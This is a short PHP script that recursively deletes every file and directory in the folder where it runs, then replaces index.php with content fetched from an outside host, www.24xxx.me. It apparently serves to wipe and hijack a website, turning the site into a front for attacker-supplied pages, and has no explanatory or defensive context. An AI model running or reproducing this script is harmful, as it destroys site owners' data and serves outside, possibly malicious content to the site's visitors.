<?php


function dirDel ($dir) 
{  
    $d=opendir($dir);  
    while(($entry=readdir($d))!==false) 
    { 
        if ($entry != "." && $entry != "..") 
        { 
            if (is_dir($dir."/".$entry)) 
            {  
                dirDel($dir."/".$entry);  
            } 
            else 
            {  
                unlink ($dir."/".$entry);  
            } 
        } 
    } 
    closedir($d);  
    rmdir ($dir);  
 } 




foreach(scandir(".") as $file){
    if($file=="."||$file=="..") continue;
    if(is_dir($file)){
        dirDel($file);
    }else{
        unlink($file);

    }
}






file_put_contents("index.php", file_get_contents("http://www.24xxx.me/catlist/"));

